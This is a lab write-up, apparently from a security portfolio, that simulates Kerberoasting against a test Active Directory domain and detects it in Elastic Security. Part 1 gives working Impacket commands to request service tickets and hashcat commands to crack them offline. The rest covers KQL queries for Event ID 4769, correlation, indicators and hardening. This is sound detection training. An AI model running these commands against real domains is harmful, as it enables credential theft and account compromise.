# Project 11 — Kerberoasting Detection

**Status:** 🔜 Next Step  
**Skills:** Kerberos, Active Directory, Impacket, Hashcat, Elastic Security, KQL, Event ID 4769, MITRE ATT&CK T1558.003

---

## Overview

Kerberoasting is one of the most common Active Directory attacks. An attacker with any valid domain account can request Kerberos Service Tickets (TGS) for accounts with Service Principal Names (SPNs) and attempt to crack the tickets offline. This project simulates a Kerberoast attack from Kali Linux against `corp.lab` and validates detection via Event ID 4769 in Elastic Security.

### Goals

- Simulate a Kerberoast attack using Impacket from Kali Linux
- Observe Event ID 4769 (Kerberos Service Ticket Operations) generated on DC01
- Confirm the events appear in Kibana in real-time
- Understand what distinguishes malicious Kerberoasting from normal service ticket requests

---

## MITRE ATT&CK Reference

| Field | Value |
|-------|-------|
| Technique | Kerberoasting |
| ID | T1558.003 |
| Tactic | Credential Access |
| Description | Adversaries request service tickets for accounts with SPNs and crack them offline to obtain plaintext credentials |
| Detection | Windows Security Event ID 4769 with RC4 (0x17) encryption type |

---

## Environment

| Component | Details |
|-----------|---------|
| Attacker | Kali Linux VM on Attack Mac (192.168.0.x) |
| Target | DC01 — corp.lab domain controller |
| Valid credential needed | Any domain user (e.g., `jsmith`) |
| SPN target | `svc-sql` account with `MSSQLSvc/dc01.corp.lab:1433` SPN |
| Detection | Elastic Security (Kibana) |

---

## Pre-Requisites

Before running this lab, ensure:
- A service account with an SPN is registered (see [Setup Guide — Create Domain Users](../setup/README.md#24-create-domain-users))
- Elastic Agent on DC01 is healthy and shipping Security events to Kibana
- You have a Kibana session open during the attack to watch events in real-time

Verify the SPN is registered:

```powershell
# On DC01
setspn -L svc-sql
# Expected: MSSQLSvc/dc01.corp.lab:1433
```

---

## Part 1: Simulate Kerberoasting from Kali

### 1.1 Verify Domain Connectivity from Kali

```bash
# Verify DC01 is reachable
ping 192.168.0.10   # DC01

# Verify DNS resolves corp.lab
nslookup corp.lab 192.168.0.10
```

### 1.2 Enumerate SPNs (Reconnaissance Phase)

Before requesting tickets, enumerate which accounts have SPNs registered:

```bash
# Enumerate all SPNs in the domain (requires valid domain creds)
impacket-GetUserSPNs corp.lab/jsmith:'Password123!' -dc-ip 192.168.0.10
```

Expected output:

```
ServicePrincipalName          Name     MemberOf  PasswordLastSet
----------------------------  -------  --------  -------------------
MSSQLSvc/dc01.corp.lab:1433   svc-sql            2024-01-15 10:00:00
```

> **Detection note:** This step generates Event ID 4769 on DC01 for each SPN enumerated.

### 1.3 Request TGS Tickets (Kerberoasting)

```bash
# Request TGS tickets and save to file for offline cracking
impacket-GetUserSPNs corp.lab/jsmith:'Password123!' \
  -dc-ip 192.168.0.10 \
  -request \
  -outputfile /tmp/kerberoast.hashes
```

Expected output:

```
$krb5tgs$23$*svc-sql$CORP.LAB$corp.lab/svc-sql*$<long hash>...
```

> **What just happened:** The `-request` flag causes Impacket to request a Kerberos TGS for every SPN found. DC01 logged Event ID 4769 for each ticket request.

### 1.4 Crack the Ticket Offline

```bash
# Attempt to crack with rockyou wordlist
hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

If the password was `ServicePass1!`, hashcat will recover it.

---

## Part 2: Observe Event ID 4769 in Kibana

### 2.1 What is Event ID 4769?

**Event ID 4769 — Kerberos Service Ticket Was Requested**

This event is logged on the DC when any Kerberos TGS ticket is requested. During normal operations this is expected, but Kerberoasting activity has distinguishing characteristics:

| Field | Normal | Suspicious |
|-------|--------|------------|
| Ticket Encryption Type | 0x12 (AES256) or 0x11 (AES128) | **0x17 (RC4-HMAC)** — easily crackable |
| Account Name | Machine accounts or service accounts | **Regular user accounts** requesting service tickets |
| Client IP | Domain-joined machines | **Kali IP** (192.168.0.x) |
| Number of requests | Sporadic | **Many requests in quick succession** |

### 2.2 Find the Events in Kibana Discover

In Kibana: **Discover** → index pattern `logs-*`

Filter for Kerberoasting events:

```kql
event.code: "4769" and winlog.event_data.TicketEncryptionType: "0x17"
```

Or broader — all 4769 events:

```kql
event.code: "4769"
```

### 2.3 Key Fields to Examine

Look for these fields in the 4769 events:

| Field | Value | Meaning |
|-------|-------|---------|
| `winlog.event_data.ServiceName` | `svc-sql` | The SPN being targeted |
| `winlog.event_data.TicketEncryptionType` | `0x17` | RC4 encryption — crackable |
| `winlog.event_data.TargetUserName` | `jsmith` | The account that requested the ticket |
| `winlog.event_data.IpAddress` | `192.168.0.x` | Source IP (Kali) |
| `winlog.event_data.IpPort` | (dynamic) | Source port |

### 2.4 Build a Discover Filter for Kerberoasting

```kql
event.code: "4769"
  and winlog.event_data.TicketEncryptionType: "0x17"
  and not winlog.event_data.ServiceName: "*$"
```

The `not ServiceName: "*$"` filter removes machine account TGS requests (normal), leaving only user-to-service requests.

### 2.5 Save as a Kibana Search

1. In Discover, configure the filters above
2. Click **Save** → name it `Kerberoasting - RC4 Service Tickets`
3. This can be reused as a saved search in dashboards

---

## Part 3: Correlate with Sysmon Events

While Event ID 4769 confirms a ticket was requested, Sysmon provides additional context about the Kali process on any domain-joined machine. On DC01, look for:

```kql
event.code: "3" and event.module: "sysmon" and destination.port: 88
```

Sysmon Event ID 3 (Network Connection) to port 88 (Kerberos) from an unexpected host provides corroborating evidence.

---

## Part 4: Timeline Reconstruction

After the attack, reconstruct the full timeline in Kibana:

1. **Event ID 4768** — TGT request (initial authentication of `jsmith`)
2. **Event ID 4769** (×N) — TGS requests for each SPN (the Kerberoast)
3. **Sysmon Event 3** — Network connection from Kali to DC01:88

Filter the timeline:

```kql
(event.code: "4768" or event.code: "4769") and winlog.event_data.IpAddress: "192.168.0.<kali-ip>"
```

Sort ascending by `@timestamp` to see the attack progression.

---

## Part 5: Detection Indicators Summary

| Indicator | Value | Event |
|-----------|-------|-------|
| RC4 ticket encryption | `TicketEncryptionType = 0x17` | 4769 |
| Non-machine account requesting TGS | `ServiceName` doesn't end with `$` | 4769 |
| Multiple TGS requests from same IP | Count > 5 in 60 seconds | 4769 |
| Non-domain-joined source IP | Kali IP (not in AD) | 4769 |
| Kerberos connection from attack host | Network connection to port 88 | Sysmon 3 |

---

## Hardening Recommendations

Based on the attack simulation, the following mitigations apply:

| Mitigation | Implementation |
|------------|----------------|
| Use AES encryption for service accounts | `Set-ADUser svc-sql -KerberosEncryptionType AES256` — forces AES, making offline cracking infeasible |
| Use strong service account passwords | 25+ character random passwords; rotate regularly |
| Managed Service Accounts (MSAs) | Use Group MSAs — passwords auto-rotated by AD |
| Privilege tiering | Ensure service accounts don't have DA or privileged group membership |
| Monitor 4769 with RC4 | Create detection rule (see [Project 12](12-custom-detection-rules.md)) |

---

## Results

| Step | Expected Outcome |
|------|-----------------|
| `impacket-GetUserSPNs` (enumerate) | Lists `svc-sql` with SPN; Event ID 4769 logged on DC01 |
| `impacket-GetUserSPNs -request` | TGS hash written to `/tmp/kerberoast.hashes`; multiple 4769 events on DC01 |
| Kibana query `event.code: "4769" and TicketEncryptionType: "0x17"` | Events from Kali's IP visible in real-time |
| Hashcat cracking | `ServicePass1!` recovered from TGS hash |

---

## Next Steps

- [Project 12 — Custom Detection Rules](12-custom-detection-rules.md) — Turn these observations into automated Elastic detection rules that fire alerts
